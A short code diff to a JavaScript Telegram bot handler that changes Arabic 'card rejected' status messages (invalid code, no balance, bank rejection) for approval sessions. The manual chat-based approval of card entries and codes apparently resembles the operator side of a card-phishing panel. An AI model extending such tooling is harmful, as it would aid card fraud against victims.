@@ -54,21 +54,21 @@ const setupCallbacks = () => {
 
     if (data.startsWith('reject_card_invalid_')) {
       const sessionId = data.replace('reject_card_invalid_', '');
-      approvalStore.setStatus(sessionId, 'error', 'كود غير صحيح');
+      approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة - كود غير صحيح');
       bot.sendMessage(chatId, '❌ تم رفض البطاقة - كود غير صحيح');
       return;
     }
 
     if (data.startsWith('reject_card_nobalance_')) {
       const sessionId = data.replace('reject_card_nobalance_', '');
-      approvalStore.setStatus(sessionId, 'error', 'لا يوجد رصيد');
+      approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة - لا يوجد رصيد');
       bot.sendMessage(chatId, '❌ تم رفض البطاقة - لا يوجد رصيد');
       return;
     }
 
     if (data.startsWith('reject_card_rejected_')) {
       const sessionId = data.replace('reject_card_rejected_', '');
-      approvalStore.setStatus(sessionId, 'error', 'رفض البطاقة');
+      approvalStore.setStatus(sessionId, 'error', 'تم رفض البطاقة');
       bot.sendMessage(chatId, '❌ تم رفض البطاقة - رفض البنك');
       return;
     }
